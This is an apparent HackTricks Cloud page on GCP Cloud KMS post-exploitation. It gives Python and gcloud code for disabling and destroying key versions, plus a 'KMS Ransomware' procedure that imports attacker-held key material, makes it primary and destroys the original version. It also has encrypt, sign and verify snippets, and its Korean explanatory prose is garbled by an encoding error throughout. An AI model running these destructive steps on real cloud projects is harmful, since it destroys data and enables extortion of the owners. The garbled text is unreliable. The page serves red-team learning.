# GCP - KMS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”:** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œ.

</details>
{% endhint %}

## KMS

KMSì— ëŒ€í•œ ê¸°ë³¸ ì •ë³´ë¥¼ ì°¾ìœ¼ì„¸ìš”:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

### `cloudkms.cryptoKeyVersions.destroy`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” KMS ë²„ì „ì„ íŒŒê´´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ë ¤ë©´ ë¨¼ì € í‚¤ë¥¼ ë¹„í™œì„±í™”í•œ ë‹¤ìŒ íŒŒê´´í•´ì•¼ í•©ë‹ˆë‹¤:
```python
# pip install google-cloud-kms

from google.cloud import kms

def disable_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Disables a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to disable the key version.
client.update_crypto_key_version(request={'crypto_key_version': {'name': key_version_name, 'state': kms.CryptoKeyVersion.State.DISABLED}})

def destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version):
"""
Destroys a key version in Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Call the API to destroy the key version.
client.destroy_crypto_key_version(request={'name': key_version_name})

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'  # Version number to disable and destroy

# Disable the key version
disable_key_version(project_id, location_id, key_ring_id, key_id, key_version)

# Destroy the key version
destroy_key_version(project_id, location_id, key_ring_id, key_id, key_version)
```
### KMS Ransomware

AWSì—ì„œëŠ” KMS ë¦¬ì†ŒìŠ¤ ì •ì±…ì„ ìˆ˜ì •í•˜ê³  ê³µê²©ìì˜ ê³„ì •ë§Œ í‚¤ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ì—¬ KMS í‚¤ë¥¼ ì™„ì „íˆ **íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë¦¬ì†ŒìŠ¤ ì •ì±…ì´ GCPì—ëŠ” ì¡´ì¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì´ëŠ” ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜, ê¸€ë¡œë²Œ KMS Ransomwareë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ë‹¨ê³„ê°€ í¬í•¨ë©ë‹ˆë‹¤:

* ê³µê²©ìê°€ ê°€ì ¸ì˜¨ í‚¤ ì¬ë£Œë¡œ **ìƒˆ ë²„ì „ì˜ í‚¤ë¥¼ ìƒì„±**

{% code overflow="wrap" %}
```bash
gcloud kms import-jobs create [IMPORT_JOB] --location [LOCATION] --keyring [KEY_RING] --import-method [IMPORT_METHOD] --protection-level [PROTECTION_LEVEL] --target-key [KEY]
```
{% endcode %}

* **ê¸°ë³¸ ë²„ì „**ìœ¼ë¡œ ì„¤ì • (í–¥í›„ ì•”í˜¸í™”ë˜ëŠ” ë°ì´í„°ì— ëŒ€í•´)
* ì´ì „ ë²„ì „ìœ¼ë¡œ ì•”í˜¸í™”ëœ **ì´ì „ ë°ì´í„° ì¬ì•”í˜¸í™”**ë¥¼ ìƒˆ ë²„ì „ìœ¼ë¡œ ìˆ˜í–‰
* **KMS í‚¤ ì‚­ì œ**
* ì´ì œ ì›ë³¸ í‚¤ ìë£Œë¥¼ ê°€ì§„ ê³µê²©ìë§Œ ì•”í˜¸í™”ëœ ë°ì´í„°ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŒ

#### ìƒˆ ë²„ì „ì„ ê°€ì ¸ì˜¤ê³  ì´ì „ ë°ì´í„°ë¥¼ ë¹„í™œì„±í™”/ì‚­ì œí•˜ëŠ” ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```bash
# Encrypt something with the original key
echo "This is a sample text to encrypt" > /tmp/my-plaintext-file.txt
gcloud kms encrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--plaintext-file my-plaintext-file.txt \
--ciphertext-file my-encrypted-file.enc

# Decrypt it
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -


# Create an Import Job
gcloud kms import-jobs create my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--import-method "rsa-oaep-3072-sha1-aes-256" \
--protection-level "software"

# Generate key material
openssl rand -out my-key-material.bin 32

# Import the Key Material (it's encrypted with an asymetrict key of the import job previous to be sent)
gcloud kms keys versions import \
--import-job my-import-job \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--algorithm "google-symmetric-encryption" \
--target-key-file my-key-material.bin

# Get versions
gcloud kms keys versions list \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key

# Make new version primary
gcloud kms keys update \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--primary-version 2

# Try to decrypt again (error)
gcloud kms decrypt \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--ciphertext-file my-encrypted-file.enc \
--plaintext-file -

# Disable initial version
gcloud kms keys versions disable \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key 1

# Destroy the old version
gcloud kms keys versions destroy \
--location us-central1 \
--keyring kms-lab-2-keyring \
--key kms-lab-2-key \
--version 1

```
### `cloudkms.cryptoKeyVersions.useToEncrypt` | `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation`

`cloudkms.cryptoKeyVersions.useToEncrypt` ë° `cloudkms.cryptoKeyVersions.useToEncryptViaDelegation` ê¶Œí•œì€ ê³µê²©ìê°€ ì•”í˜¸í™” í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ ì•”í˜¸í™”í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ê¶Œí•œì„ í†µí•´ ê³µê²©ìëŠ” ë¯¼ê°í•œ ì •ë³´ë¥¼ ì•”í˜¸í™”í•˜ì—¬ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ê¶Œí•œ ë‚¨ìš© ì˜ˆì‹œ

```bash
gcloud kms encrypt --key <KEY_NAME> --keyring <KEYRING_NAME> --location <LOCATION> --plaintext-file <PLAINTEXT_FILE> --ciphertext-file <CIPHERTEXT_FILE>
```

ìœ„ ëª…ë ¹ì–´ëŠ” ì§€ì •ëœ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ í‰ë¬¸ íŒŒì¼ì„ ì•”í˜¸í™”í•˜ê³  ì•”í˜¸ë¬¸ íŒŒì¼ë¡œ ì €ì¥í•©ë‹ˆë‹¤.
```python
from google.cloud import kms
import base64

def encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext):
"""
Encrypts data using a symmetric key from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key name.
key_name = client.crypto_key_path(project_id, location_id, key_ring_id, key_id)

# Convert the plaintext to bytes.
plaintext_bytes = plaintext.encode('utf-8')

# Call the API.
encrypt_response = client.encrypt(request={'name': key_name, 'plaintext': plaintext_bytes})
ciphertext = encrypt_response.ciphertext

# Optional: Encode the ciphertext to base64 for easier handling.
return base64.b64encode(ciphertext)

# Example usage
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
plaintext = 'your-data-to-encrypt'

ciphertext = encrypt_symmetric(project_id, location_id, key_ring_id, key_id, plaintext)
print('Ciphertext:', ciphertext)
```
### `cloudkms.cryptoKeyVersions.useToSign`

`cloudkms.cryptoKeyVersions.useToSign` ê¶Œí•œì´ ìˆëŠ” ê²½ìš°, ì„œëª… ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¶Œí•œì€ ë°ì´í„°ì˜ ë¬´ê²°ì„±ì„ í™•ì¸í•˜ê±°ë‚˜ ì¸ì¦ì„œë¥¼ ìƒì„±í•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `cloudkms.cryptoKeyVersions.useToDecrypt`

`cloudkms.cryptoKeyVersions.useToDecrypt` ê¶Œí•œì´ ìˆëŠ” ê²½ìš°, ì•”í˜¸í™”ëœ ë°ì´í„°ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¶Œí•œì€ ë¯¼ê°í•œ ë°ì´í„°ì— ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `cloudkms.cryptoKeyVersions.viewPublicKey`

`cloudkms.cryptoKeyVersions.viewPublicKey` ê¶Œí•œì´ ìˆëŠ” ê²½ìš°, ê³µê°œ í‚¤ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¶Œí•œì€ ê³µê°œ í‚¤ ì•”í˜¸í™” ì‹œìŠ¤í…œì—ì„œ ì¤‘ìš”í•œ ì—­í• ì„ í•©ë‹ˆë‹¤.
```python
import hashlib
from google.cloud import kms

def sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message):
"""
Sign a message using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Call the API to sign the digest.
sign_response = client.asymmetric_sign(name=key_version_name, digest=digest)
return sign_response.signature

# Example usage for signing
project_id = 'your-project-id'
location_id = 'your-location'
key_ring_id = 'your-key-ring'
key_id = 'your-key-id'
key_version = '1'
message = 'your-message'

signature = sign_asymmetric(project_id, location_id, key_ring_id, key_id, key_version, message)
print('Signature:', signature)
```
### `cloudkms.cryptoKeyVersions.useToVerify`

`cloudkms.cryptoKeyVersions.useToVerify` ê¶Œí•œì€ pentesterê°€ ì„œëª…ëœ ë°ì´í„°ë¥¼ ê²€ì¦í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ ê¶Œí•œì€ ì„œëª…ëœ ë°ì´í„°ì˜ ë¬´ê²°ì„±ì„ í™•ì¸í•˜ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤.
```python
from google.cloud import kms
import hashlib

def verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature):
"""
Verify a signature using an asymmetric key version from Cloud KMS.
"""
# Create the client.
client = kms.KeyManagementServiceClient()

# Build the key version name.
key_version_name = client.crypto_key_version_path(project_id, location_id, key_ring_id, key_id, key_version)

# Convert the message to bytes and calculate the digest.
message_bytes = message.encode('utf-8')
digest = {'sha256': hashlib.sha256(message_bytes).digest()}

# Build the verify request and call the API.
verify_response = client.asymmetric_verify(name=key_version_name, digest=digest, signature=signature)
return verify_response.success

# Example usage for verification
verified = verify_asymmetric_signature(project_id, location_id, key_ring_id, key_id, key_version, message, signature)
print('Verified:', verified)
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* PRì„ ì œì¶œí•˜ì—¬ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
